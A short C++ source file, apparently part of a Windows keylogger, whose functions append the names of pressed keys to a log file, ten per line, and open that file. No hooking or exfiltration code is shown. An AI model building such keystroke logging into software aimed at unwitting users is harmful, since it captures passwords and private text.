#include "winkey.hpp"

void log(std::string key_name) {

	// Variable to track the number of keys appended on the current line
	// This is to avoid having infinite line
	static int nb_keys_on_line = 0;

	// Write the pressed key to the log file
	g_log_file << key_name;
	nb_keys_on_line++;

	// We don't still don't want infinite lines
	if (nb_keys_on_line > 10) {
		g_log_file << std::endl;
		nb_keys_on_line = 0;
	}
}

int open_log_file() {
	// Open the log file in append mode
	g_log_file.open(LOG_FILE, std::ios::out | std::ios::app);

	if (g_log_file.is_open()) {
		std::cout << "Log file opened." << std::endl;
		return 1;
	}
	std::cerr << "Failed to open the log file." << std::endl;
	return 0;
}
